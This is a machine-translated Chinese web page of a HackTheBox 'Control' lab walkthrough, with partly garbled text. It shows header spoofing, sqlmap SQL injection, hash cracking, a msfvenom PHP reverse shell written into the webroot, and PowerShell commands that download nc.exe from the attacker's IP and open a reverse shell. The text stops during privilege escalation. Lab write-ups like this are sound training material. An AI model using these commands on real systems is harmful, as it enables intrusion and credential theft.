<!doctype html>
<html class="no-js" lang="zh-CN">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ‘©ğŸ¾â€âš–ï¸ ğŸ‘©ğŸ¾â€ğŸ¨ âœ‹ğŸ½ ç ç®±å­ã€‚é€šé“æ§åˆ¶ã€‚é€šè¿‡æœåŠ¡æƒé™è¿›è¡ŒSQLæ³¨å…¥å’ŒLPE ğŸ§¡ âœï¸ ğŸ‘©ğŸ»â€âš–ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="æˆ‘å°†ç»§ç»­å‘å¸ƒä»HackTheBoxç½‘ç«™å‘é€çš„ç”¨äºè¿›ä¸€æ­¥å¤„ç†çš„è§£å†³æ–¹æ¡ˆã€‚
 
 åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡SQLæ³¨å…¥æ¥æ¸—é€ç³»ç»Ÿï¼Œæ·±å…¥ç ”ç©¶å‘½ä»¤è¡Œçš„å†å²è®°å½•ï¼Œå¹¶ç”±äºæ‹¥æœ‰è¯¥æœåŠ¡çš„æƒé™è€Œå¢åŠ äº†ç‰¹æƒã€‚
 
 é€šè¿‡VPNè¿æ¥åˆ°å®éªŒå®¤ã€‚å»ºè®®ä¸è¦ä»å¯ç”¨å¯¹æ‚¨é‡è¦çš„æ•°æ®çš„å·¥ä½œè®¡ç®—æœºæˆ–ä¸»æœºè¿›è¡Œè¿æ¥ï¼Œå› ä¸ºæ‚¨ä¼šä¸çŸ¥é“ä¿¡æ¯å®‰å…¨é¢†åŸŸçŸ¥è¯†çš„...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>ç ç®±å­ã€‚é€šé“æ§åˆ¶ã€‚é€šè¿‡æœåŠ¡æƒé™è¿›è¡ŒSQLæ³¨å…¥å’ŒLPE</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/499060/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/y_/ag/j1/y_agj1md5zinn0p_o8ucn6nrcfq.png" alt="å›¾ç‰‡"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘å°†ç»§ç»­å‘å¸ƒä»</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç½‘ç«™å‘é€çš„ç”¨äº</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">è¿›ä¸€æ­¥å¤„ç†çš„</font></a><font style="vertical-align: inherit;">è§£å†³æ–¹æ¡ˆ</font><font style="vertical-align: inherit;">ã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡SQLæ³¨å…¥æ¥æ¸—é€ç³»ç»Ÿï¼Œæ·±å…¥ç ”ç©¶å‘½ä»¤è¡Œçš„å†å²è®°å½•ï¼Œå¹¶ç”±äºæ‹¥æœ‰è¯¥æœåŠ¡çš„æƒé™è€Œå¢åŠ äº†ç‰¹æƒã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
é€šè¿‡VPNè¿æ¥åˆ°å®éªŒå®¤ã€‚</font><font style="vertical-align: inherit;">å»ºè®®ä¸è¦ä»å¯ç”¨å¯¹æ‚¨é‡è¦çš„æ•°æ®çš„å·¥ä½œè®¡ç®—æœºæˆ–ä¸»æœºè¿›è¡Œè¿æ¥ï¼Œå› ä¸ºæ‚¨ä¼šä¸çŸ¥é“ä¿¡æ¯å®‰å…¨é¢†åŸŸçŸ¥è¯†çš„äººè¿›å…¥ä¸“ç”¨ç½‘ç»œï¼š)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç»„ç»‡ä¿¡æ¯</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä¾¦å¯Ÿ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¿™å°æœºå™¨çš„IPåœ°å€ä¸º10.10.10.167ï¼Œæˆ‘å°†å…¶æ·»åŠ åˆ°/ etc / hostsã€‚</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.167    control.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
é¦–å…ˆï¼Œæˆ‘ä»¬æ‰«æå¼€æ”¾ç«¯å£ã€‚</font><font style="vertical-align: inherit;">ç”±äºä½¿ç”¨nmapæ‰«ææ‰€æœ‰ç«¯å£éœ€è¦å¾ˆé•¿æ—¶é—´ï¼Œå› æ­¤æˆ‘å°†é¦–å…ˆä½¿ç”¨masscanè¿›è¡Œæ­¤æ“ä½œã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬ä»¥æ¯ç§’1000ä¸ªæ•°æ®åŒ…çš„é€Ÿåº¦æ‰«ææ¥è‡ªtun0æ¥å£çš„æ‰€æœ‰TCPå’ŒUDPç«¯å£ã€‚</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.167   --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/zg/fy/fu/zgfyfurcecpe-cka_lnykhsrcne.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç°åœ¨ï¼Œæœ‰å…³åœ¨ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨-Aé€‰é¡¹è¿è¡Œæ‰«æã€‚</font></font><br>
<pre><code class="bash hljs">nmap -A control.htb -p80,135,3306,49667,49666</code></pre><br>
<img src="https://habrastorage.org/webt/eo/ql/7a/eoql7aimt9_z47br5j4v_vmfzai.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä¸»æœºæ­£åœ¨è¿è¡ŒWebæœåŠ¡å™¨ã€‚è®©æˆ‘ä»¬çœ‹çœ‹é‚£é‡Œæœ‰ä»€ä¹ˆã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jg/gj/eg/jggjeg_agns8gedjluaymnrgmuc.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è€Œä¸”æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªæŒ‡å‘ç®¡ç†é¢æ¿çš„é“¾æ¥ã€‚ä½†æ˜¯æˆ‘ä»¬è¢«å‘ŠçŸ¥æ²¡æœ‰æ ‡é¢˜ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡ä»£ç†è¿›è¡Œè”ç³»ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ty/qu/zn/tyquznnocwmjntlmqzrfa2exkeq.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åŒæ—¶ï¼Œåœ¨èµ·å§‹é¡µçš„æºä»£ç ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä»¥ä¸‹æ¶ˆæ¯ï¼š</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ww/rb/ht/wwrbhtb-ecfdehebmwvxaorailq.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ¯”è¾ƒä½¿ç”¨ä»£ç†æ‰€éœ€çš„å†…å®¹å’Œæ‰¾åˆ°çš„åœ°å€ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨éœ€è¦ä»”ç»†é˜…è¯»å®ƒã€‚ä»£ç†æ˜¾ç¤ºåœ¨HTTPåè®®çš„x-forward-foræ ‡å¤´ä¸­ã€‚è®©æˆ‘ä»¬å…¬å¼€ä¸€ä¸‹ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xt/7v/gz/xt7vgzpnuhaxx7wwxt_t1a8mjgm.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬æˆåŠŸåœ°è¿›å…¥äº†ç®¡ç†é¡µé¢ã€‚è®©æˆ‘ä»¬æµè§ˆä¸€ä¸‹æµè§ˆå™¨ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/k6/9v/jt/k69vjt9fkb-slnguropll7g4yws.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä½†æ˜¯ï¼Œå½“æ‚¨å°è¯•æ‰§è¡ŒæŸäº›æ“ä½œæ—¶ï¼Œä»–ä»¬ä¼šå°†æˆ‘ä»¬å¸¦åˆ°å¸¦æœ‰ä»£ç†æ¶ˆæ¯çš„é¡µé¢ä¸Šã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰æ›¿æ¢æ‰¾åˆ°çš„æ ‡é¢˜ã€‚ä¸ºäº†é¿å…æ¯æ¬¡éƒ½åœ¨Burp Suiteä¸­æ‰§è¡Œæ­¤æ“ä½œï¼Œè¯·åœ¨â€œä»£ç†â€-&gt;â€œé€‰é¡¹â€é€‰é¡¹å¡ä¸­æ‰¾åˆ°â€œåŒ¹é…å’Œæ›¿æ¢â€åŠŸèƒ½ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ee/bp/jx/eebpjxadru01wuroipptxqtqx-q.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¹¶æ·»åŠ ä¸€ä¸ªæ–°æ¡ç›®ï¼Œè¯¥æ¡ç›®å°†è‡ªåŠ¨å°†æ­¤æ ‡å¤´æ·»åŠ åˆ°æ‰€æœ‰ä¼ å‡ºè¯·æ±‚ä¸­ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ts/qi/xp/tsqixpvs8glppx4sw6zrt9byo_k.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¹¶æµ‹è¯•æœç´¢å­—æ®µï¼Œæˆ‘ä»¬å‘ç°SQLæ³¨å…¥ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rl/0n/bn/rl0nbntyfysfaidg_kmx6jrqpk0.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¯¹äºæ“ä½œï¼Œæˆ‘ä»¬ä½¿ç”¨sqlmapã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬å°†æ­¤è¯·æ±‚ä¿å­˜åˆ°æ–‡ä»¶ï¼ˆå¤åˆ¶åˆ°æ–‡ä»¶ï¼‰å¹¶è¿è¡Œsqlmapï¼Œå¹¶å°†æ­¤æ–‡ä»¶ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req</code></pre><br>
<img src="https://habrastorage.org/webt/c9/ir/pl/c9irplxxa0exy0byxlfofpmtvk8.png" alt="å›¾ç‰‡"><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å…¥å£ç‚¹</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
è®©æˆ‘ä»¬çœ‹çœ‹å¯ç”¨çš„æ•°æ®åº“ã€‚</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --dbs</code></pre><br>
<img src="https://habrastorage.org/webt/s_/2z/t_/s_2zt_w40pnldgxyt-cmxmzkvfw.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è®©æˆ‘ä»¬æ‰¾å‡ºå¯ç”¨çš„å‡­æ®ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬çœ‹çœ‹mysqlæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ã€‚</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql --tables</code></pre><br>
<img src="https://habrastorage.org/webt/ke/-v/je/ke-vje10bm0a0wxqsvtbkloeetu.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å› æ­¤ï¼Œæˆ‘ä»¬å¯¹ç”¨æˆ·è¡¨æ„Ÿå…´è¶£ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬è·å–æ‰€æœ‰åˆ—çš„åç§°ã€‚</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user --columns</code></pre><br>
<img src="https://habrastorage.org/webt/19/gw/or/19gworxp_r4qy1kxbey7yvbtuko.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨æ‰€æœ‰åˆ—ä¸­ï¼Œæœ€æœ‰è¶£çš„æ˜¯ç”¨æˆ·å’Œå¯†ç ã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬äº†è§£å…¶ä¸­çš„å†…å®¹ã€‚</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user -C User,Password --dump</code></pre><br>
<img src="https://habrastorage.org/webt/e-/76/b4/e-76b4pv25daqhkvxf-zwhqha1g.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¯¥æ•°æ®åº“åŒ…å«å¤šä¸ªç”¨æˆ·ã€‚</font><font style="vertical-align: inherit;">Sqlmapæä¾›äº†ç ´è§£å“ˆå¸Œçš„æ–¹æ³•ã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªå­—å…¸æ”»å‡»ï¼Œè¡¨æ˜æˆ‘ä»¬è¦ä½¿ç”¨å­—å…¸å¹¶ç¼–å†™é€šå¾€rockyouçš„è·¯å¾„ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/og/fp/us/ogfpusgoxax5y4oby4r4isautx8.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å‡ ç§’é’Ÿåï¼Œæˆ‘ä»¬å°†ä¸ºæ‚¨æä¾›ä¸€ä¸ªåŒ…å«ç”¨æˆ·åå’Œå¯†ç å“ˆå¸Œè¡¨çš„è¡¨æ ¼ã€‚</font><font style="vertical-align: inherit;">å¦‚æœsqlmapèƒ½å¤Ÿç ´è§£å¯†ç ï¼Œå®ƒå°†åœ¨æ‹¬å·ä¸­çš„å“ˆå¸Œæ—è¾¹æŒ‡ç¤ºè¯¥å¯†ç ã€‚</font><font style="vertical-align: inherit;">å¦‚æ‚¨æ‰€è§ï¼Œæˆ‘ä»¬æ‹¥æœ‰ç”¨æˆ·hectorçš„å‡­æ®ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/3l/wh/pp/3lwhppkhebq6-zciqhxufbergyg.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘æ— æ³•ä½¿ç”¨sqlmapè·å–å¤–å£³ç¨‹åºï¼Œä½†è¦å†™å‡ºæ–‡ä»¶ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬å‘å¸ƒç½‘ç»œæ¼«æ­¥ã€‚</font><font style="vertical-align: inherit;">é¦–å…ˆï¼Œæˆ‘ä»¬ä»¥PHPæ ¼å¼ç”Ÿæˆmeterpreterè´Ÿè½½ã€‚</font></font><br>
<pre><code class="bash hljs">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.82 LPORT=4321 -f raw &gt; r.php<font></font>
cat r.php | xclip -selection clipboard &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; r.php &amp;&amp; xclip -selection clipboard -o &gt;&gt; r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç°åœ¨ï¼Œä½¿ç”¨sqlmapå°†å…¶å†™å…¥WebæœåŠ¡å™¨ç›®å½•ã€‚</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --file-write=/home/ralf/tmp/r.php --file-dest=C:/inetpub/wwwroot/r.php</code></pre><br>
<img src="https://habrastorage.org/webt/f-/ov/hr/f-ovhrbjd12vmuczfbltop8nzya.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ–‡ä»¶å·²æˆåŠŸå†™å…¥ã€‚</font><font style="vertical-align: inherit;">è¿è¡Œç›‘å¬å™¨ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/n_/8-/ql/n_8-qly45zo-_ihgxv9v54g5fwu.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¹¶è½¬åˆ°æ‚¨åœ¨WebæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚</font></font><br>
<pre><code class="bash hljs">curl http://control.htb/r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨Metasploitçª—å£ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°æˆåŠŸçš„è¿æ¥ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/bp/yy/qybpyydcw15sv7zk5borirt75jc.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å‚åŠ æœ¬æ¬¡ä¼šè®®ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ah/fu/3f/ahfu3f12oacub1nb_pbc4nu0flg.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä½†è¿™æ˜¯é—®é¢˜æ‰€åœ¨ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡å¤–å£³æ‰§è¡Œå‘½ä»¤ï¼Œæ­¤å¤–ï¼Œæ­¤ç±»å°è¯•è¿˜ä¼šé‡ç½®è¿æ¥ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬å°è¯•é€šè¿‡åœ¨è§†å›¾ï¼ˆ-Hï¼‰ä¸­éšè—çš„äº¤äº’æ¨¡å¼ï¼ˆ-iï¼‰ä¸­åˆ›å»ºPowershellè¿›ç¨‹æ¥ç»•è¿‡é”å®šï¼Œå¹¶é€šè¿‡å°†å‘½ä»¤ä½œä¸ºå‚æ•°ï¼ˆ-aï¼‰ä¼ é€’ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬æ‰¾å‡ºæˆ‘ä»¬åœ¨å“ªä¸ªç”¨æˆ·ä¸‹å·¥ä½œã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tg/c1/ph/tgc1photow2juvshqy_imh2wop0.png" alt="å›¾ç‰‡"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç”¨æˆ·</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬æœ‰èµ«å…‹æ‰˜ï¼ˆHectorï¼‰å‡­è¯ï¼Œæˆ‘ä»¬å°†æ‰¾å‡ºç³»ç»Ÿä¸­æ˜¯å¦æœ‰è¿™æ ·çš„ç”¨æˆ·ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/4r/tw/9h/4rtw9hec22vofi3vvcjfn2bgqza.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æœ‰è¿™æ ·çš„ç”¨æˆ·ï¼</font><font style="vertical-align: inherit;">ä½†æ˜¯é¦–å…ˆè¦æ‰¾å‡ºæ±½è½¦çš„åç§°ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_0/q1/yd/_0q1ydmzwb0jg10dxhfcd5gdszm.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬æœ‰ç”¨æˆ·åï¼Œå¯†ç ï¼ŒåŸŸå’Œè®¡ç®—æœºåã€‚</font><font style="vertical-align: inherit;">ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹æˆ‘ä»¬æ”¶åˆ°çš„å‡­æ®æ˜¯å¦åˆé€‚ã€‚</font><font style="vertical-align: inherit;">ä¸ºæ­¤ï¼Œè¯·ä»£è¡¨èµ«å…‹æ‰˜ï¼ˆHectorï¼‰æ‰§è¡Œâ€œ whoamiâ€ã€‚</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { whoami }"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/f7/zv/gz/f7zvgzzrv5rymzoknsodblm8qqw.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç²¾ç»†ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬è·å–å¤–å£³ã€‚</font><font style="vertical-align: inherit;">åœ¨æœ¬åœ°ä¸»æœºä¸Šè¿è¡ŒWebæœåŠ¡å™¨ã€‚</font></font><br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¹¶ä¸Šä¼ åˆ°è¿œç¨‹Netcatä¸»æœºã€‚</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { iwr 10.10.15.82/nc.exe -o C:\\Users\\Hector\\Documents\\nc.exe }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç°åœ¨æ‰“å¼€5432ç«¯å£ã€‚</font><font style="vertical-align: inherit;">nc -lvp 5432å¹¶ä»è¿œç¨‹ä¸»æœºè¿›è¡Œåå‘è¿æ¥ã€‚</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { C:\\Users\\Hector\\Documents\\nc.exe -e powershell 10.10.15.82 5432 }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å› æ­¤ï¼Œæˆ‘ä»¬å¸¦èµ°äº†ç”¨æˆ·ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/wu/-v/z6wu-vdgfchbqaobjsq83pdpdpe.png" alt="å›¾ç‰‡"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ ¹</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ¥ä¸‹æ¥ï¼Œå½“æ‚¨å°è¯•å°†ä¸€ç§ä»ä¸»æœºæ”¶é›†ä¿¡æ¯çš„æ–¹å¼ï¼ˆä¾‹å¦‚</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ï¼Œ</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerUp</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ï¼Œ</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JAWS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ï¼Œ</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinPEAS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ï¼‰</font><font style="vertical-align: inherit;">ä¸Šä¼ åˆ°ä¸»æœºæ—¶</font><font style="vertical-align: inherit;">ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°é˜²å¾¡è€…å°†å…¶åˆ é™¤ã€‚</font><font style="vertical-align: inherit;">ä½†æ˜¯WinPEASå…·æœ‰</font><font style="vertical-align: inherit;">æ— æ³•å¸è½½</font><font style="vertical-align: inherit;">çš„</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è™è ç‰ˆæœ¬</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬å°†å…¶ä¸Šä¼ åˆ°ä¸»æœºå¹¶è¿è¡Œã€‚</font><font style="vertical-align: inherit;">æ­¤å¤–ï¼Œä»…éœ€è¦ä»”ç»†æŸ¥çœ‹æ”¶é›†çš„ä¿¡æ¯ã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶ConsoleHost_history.txtï¼Œ</font></font><br>
<br>
